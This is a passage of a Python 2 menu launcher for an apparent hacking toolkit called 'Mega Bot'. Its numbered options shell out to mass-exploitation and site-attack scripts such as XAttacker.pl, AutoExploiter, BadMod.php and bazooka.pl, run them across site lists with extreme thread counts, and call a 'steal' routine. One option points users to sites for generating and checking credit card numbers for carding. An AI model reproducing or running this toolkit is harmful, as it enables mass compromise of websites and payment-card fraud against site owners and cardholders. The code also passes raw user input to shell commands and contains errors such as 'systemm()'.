    print("""U are Used Windows Mega Bot Can't install PHP moDule In Windows """)
    raw_input("\n\033[95mPress Enter To exit ..\033[0m ")  
   elif system()== 'Linux':
    os.system('sudo apt-get install php')
    print('''Run tool    
	[1] Yes
    [2] No''')
    kahba=raw_input('Mega > ')
    if kahba=='1':
     xn=raw_input('ur site ??')
     os.system('php kv.php '+xn)
    elif kahba=='2':
	 main()
    else :
	 print('unknown error :| ')
   elif maya=='3':
    main()
   else :
    print('unknown error :| ')
 elif zz=='15':
  zalzoumiya()
 elif zz=='16':
  if system() == 'Windows':
   k1=raw_input('site :')
   os.system('python setup.py install && cls && wig.py '+k1)
  elif system() == 'Linux':
   k1=raw_input('site :')
   os.system('python setup.py install && clear && wig.py '+k1)
 elif zz=='17':
  print ('''
   U NEED PHP MODULE DO U HAVE MODULE ?
   [1] RUN T00L
   [2] Install Module
   [3] Return To Menu
   ''')
  sony=raw_input('Mega > ')
  if sony=='1':
   os.system('php rhawk.php')
  elif sony=='2':
   if system() == 'Windows':
    print("""U are Used Windows Mega Bot Can't install PHP moDule In Windows """)
    raw_input("\n\033[95mPress Enter To exit ..\033[0m ")
   elif system() == 'Linux':
    os.system('sudo apt-get install php')
    print('''Run tool    
	[1] Yes
    [2] No''')
    kahba=raw_input('Mega > ')
    if kahba=='1':
	 os.system('php rhawk.php')
    elif zz=='2':
	 main()
    else : 
	 print('unknown error :| ')
  elif sony=='3':
   main()
  else :
   print('unknown error :| ')
 elif zz=='18':
  if system() == 'Windows':
   print('''you are using tool in Windows so tool it will be install
   module before run it :) don't worry it will be take 20s ''')
   qws=raw_input('What is your list name ? ')
   kori=' -t 15'
   os.system('ppm install Parallel-ForkManager && cpan -i Parallel::ForkManager && cls && perl dody.pl -u '+qws+kori)
  if system() == 'Linux':
   qws=raw_input('What is your list name ? ')
   kori=' -t 15'
   os.system('perl dody.pl -u '+qws+kori)
 elif zz=='19':
  os.system('perl bb.pl ')
 elif zz=='20':
  if system() == 'Windows':
   k1=raw_input('site :')
   os.system('xfucker.py '+k1)
  elif system() == 'Linux':
   k1=raw_input('site :')
   os.system('python3 xfucker.py '+k1)
 elif zz=='21':
  print('''
   U NEED PHP MODULE TO RUN THIS TOOL
   [1] RUN TOOL
   [2] INSTALL MODULE
   [3] Return To Menu
   ''')
  faleh=raw_input('Mega > ')
  if faleh=='1':
   os.system('php BadMod.php')
  elif faleh=='2': 
   if system() == 'Windows':
    print("""U are Used Windows Mega Bot Can't install PHP moDule In Windows """)
    raw_input("\n\033[95mPress Enter To exit ..\033[0m ")
   if system() == 'Linux':
    os.system('apt install php')
    print('''Run tool    
	[1] Yes
    [2] No''')
    kahba=raw_input('Mega > ')
    if kahba=='1':
	  os.system('php BadMod.php')
    elif kahba=='2':
	  main()
    else :
	  print('unknown error :| ')
  elif faleh=='3':
   main()
  else :
   print('unknown error :| ')
 elif zz=='22':
  print('''\n\033[91mDo u Have Sites ?
  [1] = No I want To Sites From This Bot
  [2] = Yes I Want To Check MY List Sites
  [3] = Return To Menu\033[0m''')
  t=raw_input('Mega > ')
  if t=='1':
   os.system('perl dork.pl')
  elif t=='2':
   os.system('perl XAttacker.pl')
  elif t=='3':
   main()
  else :
   print('unknown error :| ')
 elif zz=='23':
  os.system('perl bazooka.pl ')
 elif zz=='24':  
  print('''
   PLEASE INSTALL MODULE 1st
   [1] Run Tool
   [2] Install Module
   [3] Return To Menu''')
  sellemi=raw_input('Mega > ')
  if sellemi=='1':
   flo=raw_input('sites List > ')
   kk=' -t 999999999999'
   os.system('perl ttt3.pl -u '+flo+kk)
  elif sellemi=='2':
   if system() == 'Windows':
    os.system('cd C:\Perl64 && cpan Parallel::ForkManager')
   if system() == 'Linux':
    os.system('sudo apt-get install libparallel-forkmanager-perl ')
    print('''Run Tool 
	[1] Yes 
	[2] No''')
    amir=raw_input('Mega > ')
    if amir=='1':
     flo=raw_input('sites List > ')
     kk=' -t 999999999999'
     os.system('perl ttt3.pl -u '+flo+kk)
    elif amir=='2':
	 main()
    else :
	 print('unknown error :| ')
  elif sellemi=='3':
   main()
  else :
   print('unknown error :| ')
 elif zz=='25':
  if system() == 'Windows':
   os.system('python boy.py')
  if system() == 'Linux':
   os.system('python3 boy.py')
 elif zz=='26':
  os.system('perl bit.pl')
 elif zz=='27':
  os.system('perl asq.pl')
 elif zz=='28':
  os.system('perl slo.pl')
 elif zz=='29':
  print('''
  H3LL0 GUYS
  TO GENERATE CCGEN U can get multi just write ccgen in google this 
  some sites u can using it : https://sieuthuthuat.com/bin/
  TO CHECK UR CC GO TO : https://sieuthuthuat.com/check/''')
  raw_input("\n\033[95mPress Enter To exit ..\033[0m ")
 elif zz=='30':
  if system() == 'Windows':
   os.system('a.py')
  if system() == 'Linux':
   os.system('python3 a.py')
 elif zz=='31':
  os.system('perl beast.pl')
 elif zz=='32':
  AutoExploiter()
 elif zz=='33':
  os.system('python2 hashti.py')
 elif zz=='34':
  os.system('bash pip.sh')
 elif zz=='35':
  os.system('bash cc.sh')
 elif zz=='36':
  fnhack()
 elif zz=='37':
  os.system('perl bfwdps.pl')
 elif zz=='38':
  print('''
  [1]steam
  [2]HMA ''')
  kitkat=raw_input('Mega > ')
  if kitkat=='1':
   hma()
  elif kitkat=='2':
   steal()
  else :
   print('unknown error :| ')
 elif zz=='39':
  if system() == 'Windows':
   os.system('python cdd.py')
  if system() == 'Linux':
   os.system('pip2 install -r requirements.txt && python2 cdd.py')
 elif zz=='40':
  if system() == 'Windows':
   os.system('f4c.py')
  if systemm() == 'Linux':
   os.system('python3 f4c.py')
 elif zz=='41':
  os.system('perl qs.pl')
 elif zz=='42':
  if system() == 'Windows':
   os.system('python ccv.py')
  if system() == 'Linux':
   os.system('pip2 install -r requirements.txt && python3 ccv.py')
 elif zz=='98':
  zibyy()
 elif zz=='99':
  samara()
main()
